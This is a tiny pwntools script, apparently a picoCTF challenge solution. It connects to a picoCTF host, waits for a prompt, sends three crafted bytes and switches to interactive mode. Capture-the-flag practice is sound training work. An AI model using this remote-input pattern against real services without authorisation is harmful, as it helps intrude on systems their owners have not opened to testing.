from pwn import *

host="candy-mountain.picoctf.net"
port=62325

r = remote(host,port)

r.recvuntil(b'==> ')
r.sendline(b'\x65\x65\x65')

r.interactive()
